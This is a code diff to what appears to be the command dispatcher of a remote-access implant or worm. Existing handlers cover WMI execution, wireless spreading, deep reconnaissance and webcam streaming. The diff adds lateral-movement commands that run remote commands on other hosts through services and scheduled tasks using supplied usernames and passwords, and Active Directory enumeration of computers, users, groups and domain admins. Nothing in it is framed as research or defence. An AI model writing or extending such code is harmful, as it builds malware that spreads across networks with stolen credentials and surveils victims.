@@ -17,6 +17,9 @@
 #include "../utils/Shared.h"
 #include "../lateral/WmiExec.h"
 #include "../lateral/WirelessSpread.h"
+#include "../lateral/SvcExec.h"
+#include "../lateral/TaskExec.h"
+#include "../lateral/ADEnum.h"
 #include "../fs/FileSystem.h"
 #include "../recon/DeepRecon.h"
 #include "../crypto/Base64.h"
@@ -135,6 +138,37 @@ void TaskDispatcher::dispatch(const Task& task) {
             }
             case TaskType::LATERAL_WIRELESS: {
                 result.output = lateral::SpreadWireless(task.cmd);
+                break;
+            }
+            case TaskType::LATERAL_SVC: {
+                // target|user|pass|cmd
+                std::string target, user, pass, rcmd;
+                std::istringstream iss(task.cmd);
+                std::getline(iss, target, '|');
+                std::getline(iss, user, '|');
+                std::getline(iss, pass, '|');
+                std::getline(iss, rcmd);
+                result.output = "LATERAL_SVC:" + lateral::SvcExec(target, user, pass, rcmd);
+                break;
+            }
+            case TaskType::LATERAL_TASK: {
+                // target|user|pass|cmd
+                std::string target, user, pass, rcmd;
+                std::istringstream iss(task.cmd);
+                std::getline(iss, target, '|');
+                std::getline(iss, user, '|');
+                std::getline(iss, pass, '|');
+                std::getline(iss, rcmd);
+                result.output = "LATERAL_TASK:" + lateral::TaskExec(target, user, pass, rcmd);
+                break;
+            }
+            case TaskType::AD_ENUM: {
+                if (task.cmd == "info") result.output = "AD_INFO:" + lateral::ADEnum::GetDomainInfo();
+                else if (task.cmd == "computers") result.output = lateral::ADEnum::EnumerateComputers();
+                else if (task.cmd == "users") result.output = lateral::ADEnum::EnumerateUsers();
+                else if (task.cmd == "groups") result.output = lateral::ADEnum::EnumerateGroups();
+                else if (task.cmd == "admins") result.output = lateral::ADEnum::EnumerateDomainAdmins();
+                else result.output = "AD_ALL:\n" + lateral::ADEnum::GetDomainInfo() + "\n" + lateral::ADEnum::EnumerateDomainAdmins();
                 break;
             }
             case TaskType::WEBCAM_STREAM: {
